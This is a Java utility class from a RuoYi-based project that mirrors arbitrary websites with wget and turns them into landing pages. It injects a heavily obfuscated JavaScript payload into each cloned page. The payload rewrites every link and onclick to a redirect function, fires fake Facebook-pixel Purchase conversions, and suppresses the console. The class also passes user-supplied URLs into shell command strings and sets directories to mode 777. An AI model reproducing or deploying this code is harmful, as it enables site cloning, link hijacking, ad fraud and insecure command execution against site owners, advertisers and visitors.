package com.ruoyi.common.utils.file;

import com.alibaba.fastjson2.JSON;
import com.alibaba.fastjson2.JSONObject;
import org.springframework.stereotype.Component;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.io.InputStreamReader;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import static com.ruoyi.common.constant.Constants.*;

/**
 * @author LinE
 * 落地页操作类
 * <p>
 * www 为落地页域名
 * domain 为投手的配置落地页文件路径
 */
@Component
public class LandPageUtils {

    /**
     * 增加落地页面
     *
     * @param url 需要下载的网站URL 注意：需要是浏览器地址栏下复制的地址，在链接地址的末尾有 `/`
     * @return 返回用户此次增加的落地链接
     */
    public String downloadWebsite(String url) {
        String savePath = createUniqueDirectory(PUBLIC_DATA, "");
        System.out.println("\n\n\n" + savePath + "\n\n\n");
        String command = "wget -P " + savePath + " -c -r -e robots=off -nv -p -k " + url; // 构建wget命令
        System.out.println(shellCommandExecutor(command));
        String commandImg = "wget https://urlscan.io/liveshot/?width=240&height=" + new int[]{480, 900, 600}[new Random().nextInt(3)] + "&url=" + url + " -O " + savePath + "/saved_image.jpg";
        System.out.println(shellCommandExecutor(commandImg));
        String fileUrl = scanFolderHtml(savePath, null, false).get(0);
        System.out.println("\n\n\n" + fileUrl + "\n\n\n");
        replaceUrlsInHtmlFile(fileUrl, "var _0x89eb=['cmVwbGFjZQ==','dHJhY2s=','dEhIdms=','a21vaFc=','cHF3aGU=','Qmpnd3Q=','QVNTWG8=','dHJhY2U=','UVBjemM=','clRKRXo=','QndXZUw=','dGVzdA==','bGVXS2U=','Z2V0RWxlbWVudHNCeVRhZ05hbWU=','bXRoSHQ=','SWtwSkg=','ZmJx','UG5tTEQ=','eXZHQ2Y=','cmV0dXJuIC8iICsgdGhpcyArICIv','bG9jYXRpb24=','S3VKdFI=','Y29uc3RydWN0b3I=','WHVPRVc=','ZXJyb3I=','UHd0R2k=','dmVyc2lvbg==','SnhyQnI=','cXVldWU=','RENXcHA=','anZZZGY=','TEJRSks=','Qm5ta1c=','UkthWU8=','UXNZdWM=','e30uY29uc3RydWN0b3IoInJldHVybiB0aGlzIikoICk=','ZkxxcEo=','Y3B4Y1A=','dEpuYW0=','TVd4cFI=','bGluaw==','aW5zZXJ0QmVmb3Jl','RkZSaEc=','Q05HdWo=','Z2V0SXRlbQ==','VVNE','R29ScU8=','a2JFdXg=','d2Fybg==','aW5mbw==','dk5DTnk=','bW1EcHg=','UHVyY2hhc2U=','YXBwbHk=','UHBUZVY=','bGtqbFg=','cVZnVmU=','c2NyaXB0','VlFQbko=','dEJ1T08=','aW5pdA==','dGFibGU=','R3JMRXE=','dktoWHI=','a3NUTE8=','QVBPenQ=','eUN4Zmg=','cmV0dXJuIChmdW5jdGlvbigpIA==','QkNuelc=','c3Jj','blFlVUQ=','RXlWbWM=','YXBKa3g=','WGFJV2U=','X2ZicQ==','bE5KbnU=','RmFlTEw=','VkZtcVc=','QWRkVG9DYXJ0','Y29uc29sZQ==','Y2d2YXE=','YXpuZVo=','XihbXiBdKyggK1teIF0rKSspK1teIF19','c3BsaXQ=','Y0FTb3E=','b0Vxb0w=','YXplZ3o=','WURBU1c=','c0xqaFc=','Y2FsbE1ldGhvZA==','ZGVidWc=','Y3JlYXRlRWxlbWVudA==','ZXhjZXB0aW9u','VklSTkE=','bnZPWVE=','eVBZa1A=','bG9n','bG9hZGVk','RkJERHo=','TWt3aWc=','bVliY1g=','YXN5bmM=','aHR0cHM6Ly9jb25uZWN0LmZhY2Vib29rLm5ldC9lbl9VUy9mYmV2ZW50cy5qcw==','VVpzYWg=','b3dYQVY=','cHVzaA==','ZW54ZGU='];(function(_0x36d0de,_0x89eb1e){var _0x16ffad=function(_0x12a0ab){while(--_0x12a0ab){_0x36d0de['push'](_0x36d0de['shift']());}};var _0x290c12=function(){var _0x9a1a77={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x213a69,_0x588b70,_0x14edc0,_0x2dc5fd){_0x2dc5fd=_0x2dc5fd||{};var _0x3f76ec=_0x588b70+'='+_0x14edc0;var _0x3977e4=0x0;for(var _0x54a8cc=0x0,_0x5e85f5=_0x213a69['length'];_0x54a8cc<_0x5e85f5;_0x54a8cc++){var _0xdf1d86=_0x213a69[_0x54a8cc];_0x3f76ec+=';\\x20'+_0xdf1d86;var _0x21e335=_0x213a69[_0xdf1d86];_0x213a69['push'](_0x21e335);_0x5e85f5=_0x213a69['length'];if(_0x21e335!==!![]){_0x3f76ec+='='+_0x21e335;}}_0x2dc5fd['cookie']=_0x3f76ec;},'removeCookie':function(){return'dev';},'getCookie':function(_0x206425,_0x489735){_0x206425=_0x206425||function(_0x48141d){return _0x48141d;};var _0x397f14=_0x206425(new RegExp('(?:^|;\\x20)'+_0x489735['replace'](/([.\\$?*|{}()[]\\/+^])/g,'\\$1')+'=([^;]*)'));var _0x4c6b77=function(_0xbab1b,_0x31e8c7){_0xbab1b(++_0x31e8c7);};_0x4c6b77(_0x16ffad,_0x89eb1e);return _0x397f14?decodeURIComponent(_0x397f14[0x1]):undefined;}};var _0x5d0eed=function(){var _0x1df543=new RegExp('\\x5cw+\\x20*\\x5c(\\x5c)\\x20*{\\x5cw+\\x20*[\\x27|\\x22].+[\\x27|\\x22];?\\x20*}');return _0x1df543['test'](_0x9a1a77['removeCookie']['toString']());};_0x9a1a77['updateCookie']=_0x5d0eed;var _0x3eda67='';var _0x1b52ce=_0x9a1a77['updateCookie']();if(!_0x1b52ce){_0x9a1a77['setCookie'](['*'],'counter',0x1);}else if(_0x1b52ce){_0x3eda67=_0x9a1a77['getCookie'](null,'counter');}else{_0x9a1a77['removeCookie']();}};_0x290c12();}(_0x89eb,0x14a));var _0x16ff=function(_0x36d0de,_0x89eb1e){_0x36d0de=_0x36d0de-0x0;var _0x16ffad=_0x89eb[_0x36d0de];if(_0x16ff['XLwEQC']===undefined){(function(){var _0x12a0ab=function(){var _0x3eda67;try{_0x3eda67=Function('return\\x20(function()\\x20'+'{}.constructor(\\x22return\\x20this\\x22)(\\x20)'+');')();}catch(_0x1b52ce){_0x3eda67=window;}return _0x3eda67;};var _0x9a1a77=_0x12a0ab();var _0x5d0eed='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x9a1a77['atob']||(_0x9a1a77['atob']=function(_0x213a69){var _0x588b70=String(_0x213a69)['replace'](/=+\\$/,'');var _0x14edc0='';for(var _0x2dc5fd=0x0,_0x3f76ec,_0x3977e4,_0x54a8cc=0x0;_0x3977e4=_0x588b70['charAt'](_0x54a8cc++);~_0x3977e4&&(_0x3f76ec=_0x2dc5fd%0x4?_0x3f76ec*0x40+_0x3977e4:_0x3977e4,_0x2dc5fd++%0x4)?_0x14edc0+=String['fromCharCode'](0xff&_0x3f76ec>>(-0x2*_0x2dc5fd&0x6)):0x0){_0x3977e4=_0x5d0eed['indexOf'](_0x3977e4);}return _0x14edc0;});}());_0x16ff['cxhTlR']=function(_0x5e85f5){var _0xdf1d86=atob(_0x5e85f5);var _0x21e335=[];for(var _0x206425=0x0,_0x489735=_0xdf1d86['length'];_0x206425<_0x489735;_0x206425++){_0x21e335+='%'+('00'+_0xdf1d86['charCodeAt'](_0x206425)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x21e335);};_0x16ff['UVduit']={};_0x16ff['XLwEQC']=!![];}var _0x290c12=_0x16ff['UVduit'][_0x36d0de];if(_0x290c12===undefined){var _0x397f14=function(_0x4c6b77){this['YxVRol']=_0x4c6b77;this['jayRwB']=[0x1,0x0,0x0];this['oaOczo']=function(){return'newState';};this['hvgtTi']='\\x5cw+\\x20*\\x5c(\\x5c)\\x20*{\\x5cw+\\x20*';this['sbwsDy']='[\\x27|\\x22].+[\\x27|\\x22];?\\x20*}';};_0x397f14['prototype']['wqguTn']=function(){var _0x48141d=new RegExp(this['hvgtTi']+this['sbwsDy']);var _0xbab1b=_0x48141d['test'](this['oaOczo']['toString']())?--this['jayRwB'][0x1]:--this['jayRwB'][0x0];return this['TKVeVi'](_0xbab1b);};_0x397f14['prototype']['TKVeVi']=function(_0x31e8c7){if(!Boolean(~_0x31e8c7)){return _0x31e8c7;}return this['eJtRQN'](this['YxVRol']);};_0x397f14['prototype']['eJtRQN']=function(_0x1df543){for(var _0x2be75d=0x0,_0xdddddc=this['jayRwB']['length'];_0x2be75d<_0xdddddc;_0x2be75d++){this['jayRwB']['push'](Math['round'](Math['random']()));_0xdddddc=this['jayRwB']['length'];}return _0x1df543(this['jayRwB'][0x0]);};new _0x397f14(_0x16ff)['wqguTn']();_0x16ffad=_0x16ff['cxhTlR'](_0x16ffad);_0x16ff['UVduit'][_0x36d0de]=_0x16ffad;}else{_0x16ffad=_0x290c12;}return _0x16ffad;};!function(_0x2a1e16,_0x4a7f48,_0x5c6579,_0x1ca8e8,_0x29e054,_0x3e0c6f,_0x24af91){var _0x43be1a={};_0x43be1a[_0x16ff('0x68')]='init';_0x43be1a[_0x16ff('0x38')]=function(_0x30bd1d,_0x1aa2af,_0x196724){return _0x30bd1d(_0x1aa2af,_0x196724);};_0x43be1a[_0x16ff('0x4f')]=_0x16ff('0x63');_0x43be1a[_0x16ff('0x6')]=function(_0x30e15f,_0x36f852){return _0x30e15f!==_0x36f852;};_0x43be1a[_0x16ff('0x65')]=_0x16ff('0x9');_0x43be1a[_0x16ff('0x1')]=_0x16ff('0xa');_0x43be1a[_0x16ff('0x3f')]=function(_0xa18686){return _0xa18686();};_0x43be1a[_0x16ff('0x2e')]=function(_0x1c9b95,_0x409dbf){return _0x1c9b95+_0x409dbf;};_0x43be1a[_0x16ff('0x5a')]=function(_0x3bfc1d,_0x444172){return _0x3bfc1d+_0x444172;};_0x43be1a[_0x16ff('0x2d')]=_0x16ff('0x3a');_0x43be1a[_0x16ff('0x64')]=_0x16ff('0x36');_0x43be1a[_0x16ff('0x59')]=function(_0x131517,_0x41e0fd){return _0x131517===_0x41e0fd;};_0x43be1a[_0x16ff('0x1c')]=_0x16ff('0x48');_0x43be1a[_0x16ff('0x22')]=_0x16ff('0x56');_0x43be1a['FaeLL']=function(_0x3a9729,_0x28012b,_0x96719d,_0x2a4d79){return _0x3a9729(_0x28012b,_0x96719d,_0x2a4d79);};_0x43be1a[_0x16ff('0x55')]=_0x16ff('0x24');_0x43be1a[_0x16ff('0x40')]=_0x16ff('0x1a');_0x43be1a[_0x16ff('0x2a')]=_0x16ff('0x42');_0x43be1a['atrAa']=_0x16ff('0x32');_0x43be1a[_0x16ff('0x3e')]='5|7|3|4|6|1|2|0';_0x43be1a[_0x16ff('0x31')]=function(_0x5b2b94){return _0x5b2b94();};_0x43be1a[_0x16ff('0x12')]='2.0';var _0x490000=_0x43be1a;var _0x463fe0=function(){var _0xc660a5=!![];return function(_0x410444,_0x59c040){var _0x5020de=_0xc660a5?function(){if(_0x59c040){var _0x202ec0=_0x59c040[_0x16ff('0x2c')](_0x410444,arguments);_0x59c040=null;return _0x202ec0;}}:function(){};_0xc660a5=![];return _0x5020de;};}();var _0x28ebdf=_0x490000[_0x16ff('0x38')](_0x463fe0,this,function(){var _0xa5a08d=function(){var _0x5c37ab={};_0x5c37ab[_0x16ff('0x1b')]=_0x490000['ASSXo'];_0x5c37ab[_0x16ff('0x14')]=function(_0x2ba5c1,_0x4de03a,_0x425934){return _0x490000[_0x16ff('0x38')](_0x2ba5c1,_0x4de03a,_0x425934);};_0x5c37ab[_0x16ff('0x18')]=_0x490000[_0x16ff('0x4f')];_0x5c37ab[_0x16ff('0x29')]='PageView';var _0x410640=_0x5c37ab;if(_0x490000['IkpJH'](_0x490000[_0x16ff('0x65')],'yvGCf')){fbq(_0x410640[_0x16ff('0x1b')],_0x1ca8e8);_0x410640[_0x16ff('0x14')](fbq,_0x410640['RKaYO'],_0x410640[_0x16ff('0x29')]);}else{var _0x3f38c3=_0xa5a08d[_0x16ff('0xd')](_0x490000[_0x16ff('0x1')])()['compile'](_0x16ff('0x49'));return!_0x3f38c3[_0x16ff('0x2')](_0x28ebdf);}};return _0x490000[_0x16ff('0x3f')](_0xa5a08d);});_0x490000[_0x16ff('0x31')](_0x28ebdf);var _0x56fa79=function(){var _0x30c6b3={};_0x30c6b3[_0x16ff('0x47')]=function(_0x464c89,_0x55df61){return _0x464c89(_0x55df61);};_0x30c6b3[_0x16ff('0x1d')]=function(_0x5c7208,_0x26a909){return _0x490000[_0x16ff('0x2e')](_0x5c7208,_0x26a909);};_0x30c6b3[_0x16ff('0x6a')]=function(_0x1d730e,_0x165bd4){return _0x490000['Mkwig'](_0x1d730e,_0x165bd4);};_0x30c6b3['leWKe']=_0x490000['PpTeV'];_0x30c6b3[_0x16ff('0xc')]=_0x16ff('0x1a');_0x30c6b3[_0x16ff('0x3d')]=function(_0x2adc93,_0xc09c1b){return _0x490000['IkpJH'](_0x2adc93,_0xc09c1b);};_0x30c6b3['uciLP']=_0x16ff('0x4b');_0x30c6b3[_0x16ff('0x15')]=_0x490000[_0x16ff('0x64')];_0x30c6b3[_0x16ff('0x1e')]=function(_0x43483d,_0x17666f){return _0x490000['FBDDz'](_0x43483d,_0x17666f);};_0x30c6b3['pqwhe']=_0x490000[_0x16ff('0x1c')];var _0x24771a=_0x30c6b3;if(_0x490000[_0x16ff('0x22')]!==_0x490000[_0x16ff('0x22')]){_0x29e054['callMethod']?_0x29e054[_0x16ff('0x50')][_0x16ff('0x2c')](_0x29e054,arguments):_0x29e054[_0x16ff('0x13')]['push'](arguments);}else{var _0x227433=!![];return function(_0x3dc601,_0x293f9f){if(_0x24771a[_0x16ff('0x1e')](_0x24771a[_0x16ff('0x66')],_0x16ff('0x17'))){globalObject=_0x24771a[_0x16ff('0x47')](Function,_0x24771a[_0x16ff('0x1d')](_0x24771a[_0x16ff('0x6a')](_0x24771a[_0x16ff('0x3')],_0x24771a[_0x16ff('0xc')]),');'))();}else{var _0x2d0839=_0x227433?function(){if(_0x293f9f){if(_0x24771a['nQeUD'](_0x24771a['uciLP'],_0x24771a[_0x16ff('0x15')])){var _0x1feac7=_0x293f9f[_0x16ff('0x2c')](_0x3dc601,arguments);_0x293f9f=null;return _0x1feac7;}else{var _0xd5549e={};_0xd5549e[_0x16ff('0x57')]=func;_0xd5549e[_0x16ff('0x27')]=func;_0xd5549e['debug']=func;_0xd5549e['info']=func;_0xd5549e['error']=func;_0xd5549e[_0x16ff('0x53')]=func;_0xd5549e[_0x16ff('0x34')]=func;_0xd5549e['trace']=func;return _0xd5549e;}}}:function(){};_0x227433=![];return _0x2d0839;}};}}();var _0x2e0a6b=_0x56fa79(this,function(){var _0x5d1318={};_0x5d1318['PwtGi']=_0x490000[_0x16ff('0x4f')];_0x5d1318[_0x16ff('0x4e')]=_0x16ff('0x45');_0x5d1318[_0x16ff('0x19')]=function(_0x429bcc,_0x1f2046,_0x28ca50,_0x59b4cd){return _0x490000[_0x16ff('0x43')](_0x429bcc,_0x1f2046,_0x28ca50,_0x59b4cd);};_0x5d1318[_0x16ff('0x61')]=_0x16ff('0x2b');_0x5d1318[_0x16ff('0x25')]=_0x490000[_0x16ff('0x55')];_0x5d1318[_0x16ff('0x37')]=function(_0x47bcd7,_0x320980){return _0x47bcd7(_0x320980);};_0x5d1318['FFRhG']=function(_0x17add5,_0x30b04e){return _0x490000['Mkwig'](_0x17add5,_0x30b04e);};_0x5d1318['LBQJK']=_0x490000[_0x16ff('0x2d')];_0x5d1318[_0x16ff('0x39')]=_0x490000[_0x16ff('0x40')];_0x5d1318[_0x16ff('0x35')]=function(_0x107937,_0x3c502b){return _0x490000[_0x16ff('0x59')](_0x107937,_0x3c502b);};_0x5d1318['qVgVe']=_0x490000[_0x16ff('0x2a')];_0x5d1318['owXAV']=_0x490000['atrAa'];_0x5d1318[_0x16ff('0x5e')]='3|4|6|9|0|5|2|8|7|1';var _0x1d1ca8=_0x5d1318;var _0x49aad7=function(){};var _0x5d6111=function(){var _0x2ef22c={};_0x2ef22c[_0x16ff('0x4d')]=_0x1d1ca8[_0x16ff('0x10')];_0x2ef22c[_0x16ff('0x5')]=_0x1d1ca8[_0x16ff('0x4e')];_0x2ef22c[_0x16ff('0x26')]=function(_0x2d09ae,_0x41f667,_0x180eec,_0x5b41f3){return _0x1d1ca8[_0x16ff('0x19')](_0x2d09ae,_0x41f667,_0x180eec,_0x5b41f3);};_0x2ef22c[_0x16ff('0x8')]=_0x1d1ca8['enxde'];_0x2ef22c['BCnzW']=_0x1d1ca8[_0x16ff('0x25')];var _0x3f45e4=_0x2ef22c;var _0x216985;try{_0x216985=_0x1d1ca8['ksTLO'](Function,_0x1d1ca8[_0x16ff('0x21')](_0x1d1ca8[_0x16ff('0x16')]+_0x1d1ca8[_0x16ff('0x39')],');'))();}catch(_0xbd7d1){if(_0x1d1ca8[_0x16ff('0x35')](_0x1d1ca8[_0x16ff('0x2f')],_0x1d1ca8[_0x16ff('0x5f')])){fbq(_0x3f45e4[_0x16ff('0x4d')],_0x3f45e4[_0x16ff('0x5')]);_0x3f45e4[_0x16ff('0x26')](fbq,_0x3f45e4['azegz'],_0x3f45e4[_0x16ff('0x8')],{'value':'10','currency':_0x3f45e4[_0x16ff('0x3b')]});setTimeout(()=>window[_0x16ff('0xb')][_0x16ff('0x62')](sessionStorage[_0x16ff('0x23')](_0x16ff('0x1f'))),0xc8);}else{_0x216985=window;}}return _0x216985;};var _0x14c81f=_0x5d6111();if(!_0x14c81f['console']){_0x14c81f[_0x16ff('0x46')]=function(_0x59d291){var _0x1f3874=_0x1d1ca8[_0x16ff('0x5e')][_0x16ff('0x4a')]('|');var _0x5a41fb=0x0;while(!![]){switch(_0x1f3874[_0x5a41fb++]){case'0':_0x332998[_0x16ff('0x28')]=_0x59d291;continue;case'1':return _0x332998;case'2':_0x332998[_0x16ff('0x53')]=_0x59d291;continue;case'3':var _0x332998={};continue;case'4':_0x332998[_0x16ff('0x57')]=_0x59d291;continue;case'5':_0x332998[_0x16ff('0xf')]=_0x59d291;continue;case'6':_0x332998[_0x16ff('0x27')]=_0x59d291;continue;case'7':_0x332998[_0x16ff('0x69')]=_0x59d291;continue;case'8':_0x332998['table']=_0x59d291;continue;case'9':_0x332998[_0x16ff('0x51')]=_0x59d291;continue;}break;}}(_0x49aad7);}else{var _0xc0993f=_0x490000[_0x16ff('0x3e')][_0x16ff('0x4a')]('|');var _0x5716d4=0x0;while(!![]){switch(_0xc0993f[_0x5716d4++]){case'0':_0x14c81f[_0x16ff('0x46')][_0x16ff('0x69')]=_0x49aad7;continue;case'1':_0x14c81f['console']['exception']=_0x49aad7;continue;case'2':_0x14c81f[_0x16ff('0x46')][_0x16ff('0x34')]=_0x49aad7;continue;case'3':_0x14c81f[_0x16ff('0x46')][_0x16ff('0x51')]=_0x49aad7;continue;case'4':_0x14c81f[_0x16ff('0x46')][_0x16ff('0x28')]=_0x49aad7;continue;case'5':_0x14c81f[_0x16ff('0x46')][_0x16ff('0x57')]=_0x49aad7;continue;case'6':_0x14c81f[_0x16ff('0x46')]['error']=_0x49aad7;continue;case'7':_0x14c81f[_0x16ff('0x46')][_0x16ff('0x27')]=_0x49aad7;continue;}break;}}});_0x490000[_0x16ff('0x31')](_0x2e0a6b);if(_0x2a1e16[_0x16ff('0x7')])return;_0x29e054=_0x2a1e16[_0x16ff('0x7')]=function(){_0x29e054[_0x16ff('0x50')]?_0x29e054['callMethod'][_0x16ff('0x2c')](_0x29e054,arguments):_0x29e054[_0x16ff('0x13')]['push'](arguments);};if(!_0x2a1e16[_0x16ff('0x41')])_0x2a1e16[_0x16ff('0x41')]=_0x29e054;_0x29e054[_0x16ff('0x60')]=_0x29e054;_0x29e054[_0x16ff('0x58')]=!0x0;_0x29e054[_0x16ff('0x11')]=_0x490000[_0x16ff('0x12')];_0x29e054[_0x16ff('0x13')]=[];_0x3e0c6f=_0x4a7f48[_0x16ff('0x52')](_0x5c6579);_0x3e0c6f[_0x16ff('0x5c')]=!0x0;_0x3e0c6f[_0x16ff('0x3c')]=_0x1ca8e8;_0x24af91=_0x4a7f48[_0x16ff('0x4')](_0x5c6579)[0x0];_0x24af91['parentNode'][_0x16ff('0x20')](_0x3e0c6f,_0x24af91);}(window,document,_0x16ff('0x30'),_0x16ff('0x5d'));JSON['parse'](sessionStorage['getItem']('xid'))['forEach'](_0xb8d96e=>{var _0x54936f={};_0x54936f[_0x16ff('0x67')]=function(_0x3eb8ce,_0x7faf7d,_0x11fce6){return _0x3eb8ce(_0x7faf7d,_0x11fce6);};_0x54936f['rTJEz']=_0x16ff('0x33');_0x54936f[_0x16ff('0x54')]=_0x16ff('0x63');var _0x49d41f=_0x54936f;_0x49d41f['Bjgwt'](fbq,_0x49d41f[_0x16ff('0x0')],_0xb8d96e);_0x49d41f[_0x16ff('0x67')](fbq,_0x49d41f['VIRNA'],'PageView');});function replaceUrlForYou(){var _0x26b760={};_0x26b760[_0x16ff('0x5b')]=function(_0x349394,_0x552ccd,_0x4630a8){return _0x349394(_0x552ccd,_0x4630a8);};_0x26b760[_0x16ff('0x44')]=_0x16ff('0x63');_0x26b760[_0x16ff('0xe')]=_0x16ff('0x45');_0x26b760['oEqoL']=_0x16ff('0x24');var _0x2f3fc3=_0x26b760;_0x2f3fc3[_0x16ff('0x5b')](fbq,_0x2f3fc3[_0x16ff('0x44')],_0x2f3fc3[_0x16ff('0xe')]);fbq(_0x2f3fc3[_0x16ff('0x44')],_0x16ff('0x2b'),{'value':'10','currency':_0x2f3fc3[_0x16ff('0x4c')]});setTimeout(()=>window['location'][_0x16ff('0x62')](sessionStorage[_0x16ff('0x23')](_0x16ff('0x1f'))),0xc8);}");
        List<String> ls = scanFolderHtml(savePath, null, true);
        if (ls.size() == 0) {
            return null;
        }
        return ls.get(0);
    }

    /**
     * 增加用户配置页
     *
     * @return 返回用户此次增加的落地链接
     */
    public String configPageAdd(String username) {
        String savePath = createUniqueDirectory(USER_DATA, username);
        String command = "cp -r " + TEST_USER + " " + savePath; //复制用户配置模板文件
        System.out.println("\n" + command + "\n");
        System.out.println(shellCommandExecutor(command));
        List<String> ls = scanFolderHtml(savePath, null, true);
        if (ls.size() == 0) {
            return null;
        }
        return ls.get(0);
    }


    /**
     * 生成一个唯一的目录名，使用URL安全的Base64编码和时间戳
     * 创建一个唯一的目录名并在文件系统中创建该目录。
     *
     * @param basePath 基础路径，新目录将在此路径下创建。
     * @return 创建的目录的绝对路径，如果创建失败则返回null。
     */
    // 定义一个公共的方法，返回一个字符串类型的值
    public String createUniqueDirectory(String basePath, String username) {
        // 创建一个安全的随机数生成器
        SecureRandom random = new SecureRandom();
        // 创建一个长度为36的字节数组
        byte[] bytes = new byte[36];
        // 用随机数生成器填充字节数组
        random.nextBytes(bytes);
        // 使用 Base64 编码器将字节数组转换为一个不带填充的 URL 安全的字符串
        // 一个随机的新目录名
        // 将 Base64 编码的字符串和当前的毫秒数拼接起来，形成一个唯一的字符串
        String dirName = Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
        // 如果用户名不为空，就将用户名也拼接到目录名后面
        if (!username.isEmpty()) {
            dirName = dirName + username;
        }
        dirName += System.currentTimeMillis();
        // 创建一个 File 对象，表示要创建的目录，参数是基础路径和目录名
        File directory = new File(basePath, dirName);
        // 如果目录不存在，并且成功创建了目录，就执行以下操作
        if (!directory.exists() && directory.mkdirs()) {
            // 调用一个自定义的方法，设置目录的权限
            setPermissions(directory);
            // 返回目录的绝对路径
            return directory.getAbsolutePath();
        }
        // 否则，返回 null
        return null;
    }


    /**
     * 执行命令方法
     *
     * @param command linux 命令
     * @return 退出码
     */
    public int shellCommandExecutor(String command) {
        Process process = null;
        BufferedReader reader = null;
        BufferedReader errorReader = null;
        int exitCode = -1; // 初始化退出码

        try {
            process = Runtime.getRuntime().exec(command);
            reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

            // 读取命令的标准输出
            System.out.println("Standard output:");
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            // 读取命令的错误输出
            System.out.println("Standard error:");
            while ((line = errorReader.readLine()) != null) {
                System.out.println(line);
            }

            // 等待命令执行完成
            exitCode = process.waitFor();
            System.out.println("Exit code: " + exitCode);

        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        } finally {
            try {
                if (reader != null) {
                    reader.close();
                }
                if (errorReader != null) {
                    errorReader.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            if (process != null) {
                process.destroy();
            }
        }
        return exitCode; // 返回退出码
    }

    /**
     * 展示的落地页扫描
     *
     * @param folderPath 扫描路径
     * @return 路径下包含落地页的文件列表
     */
    public List<String> scanFolderHtml(String folderPath, String username, boolean isUrl) {
        try (Stream<Path> paths = Files.walk(Paths.get(folderPath))) {
            return paths.filter(Files::isRegularFile).filter(path -> path.getFileName().toString().contains("index.html")).filter(path -> isValidPath(path, username)).map(path -> isUrl ? convertToUrl(path) : path.toString()).collect(Collectors.toList());
        } catch (IOException e) {
            e.printStackTrace();
            return Collections.emptyList();
        }
    }

    /**
     * username为空不包含，不为空只扫描包含username的路径
     *
     * @param path     该目录下所有路径
     * @param username username
     * @return 一次过滤的路径
     */
    private boolean isValidPath(Path path, String username) {
        String pathStr = path.toString();
        return (username != null && !username.isEmpty() && pathStr.contains(username)) && !pathStr.contains("error") && !pathStr.contains("localhost");
    }

    /**
     * 去除文件路径中的部分字符，转成url
     *
     * @param path 过滤后的文件路径
     * @return url
     */
    public String convertToUrl(Path path) {
        return "https:/" + path.toString().replace("/www/admin", "").replace("index.html", "").replace("_80", "").replace("/wwwroot", "").replace(File.separator, "/");
    }

    /**
     * 设置目录权限为777
     *
     * @param directory 文件
     */
    private void setPermissions(File directory) {
        try {
            // 使用Runtime执行chmod命令
            ProcessBuilder builder = new ProcessBuilder("chmod", "777", directory.getAbsolutePath());
            Process process = builder.start();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    /**
     * 下载落地页时修改页面中a标签的href属性
     * 更改任何标签中的onclick属性
     * 暂定不输出返回值
     *
     * @param filePath 下载的落地页文件路径
     * @param jsCode   简单加密的js代码
     */
    public void replaceUrlsInHtmlFile(String filePath, String jsCode) {
        try {
            Path path = Paths.get(filePath);
            Charset charset = StandardCharsets.UTF_8;

            String content = new String(Files.readAllBytes(path), charset);
            // 替换href属性
            content = content.replaceAll("<a\\s+(?:[^>]*?\\s+)?href=\"[^\"]*\"", "<a href=\"javascript:replaceUrlForYou()\"");
            // 替换onclick属性
            content = content.replaceAll("onclick=\"[^\"]*\"", "onclick=\"replaceUrlForYou()\"");
            // 替换其他可能的URL属性
            content = content.replaceFirst("<script>", "<script>" + jsCode);

            Files.write(path, content.getBytes(charset));
            System.out.println("URL替换完成。");
        } catch (IOException e) {
            System.err.println("发生错误: " + e.getMessage());
            e.printStackTrace();
        }
    }

    /**
     * 读取 JSON 文件并返回一个 JSONObject
     *
     * @param filePath 文件路径
     * @return 如果文件路径为正常，返回文件路径下读取的json内容
     */
    public JSONObject readJsonFile(String filePath) {
        try {
            // 读取文件内容为字节数组
            byte[] bytes = Files.readAllBytes(Paths.get(filePath));
            // 使用 fastjson2 的 parseObject 方法解析字节数组为 JSONObject
            // 返回 JSONObject
            return JSON.parseObject(bytes);
        } catch (IOException e) {
            System.out.println("发生错误: " + e.getMessage());
            return null;
        }
    }

    /**
     * 修改 JSONObject 中的指定字段的值
     *
     * @param jsonObject 已读取的json内容
     * @param changes    包含要修改的字段名和值的字典
     * @return 返回新的修改后的json内容
     */
    public JSONObject modifyJson(JSONObject jsonObject, Map<String, Object> changes) {
        try {
            // 遍历修改的字段和值
            for (Map.Entry<String, Object> entry : changes.entrySet()) {
                // 获取字段名和值
                String key = entry.getKey();
                Object value = entry.getValue();
                // 使用 fastjson2 的 put 方法修改 JSONObject 中的字段值
                jsonObject.put(key, value);
            }
            // 返回修改后的 JSONObject
            return jsonObject;
        } catch (Exception e) {
            System.out.println("发生错误: " + e.getMessage());
            return null;
        }
    }
}
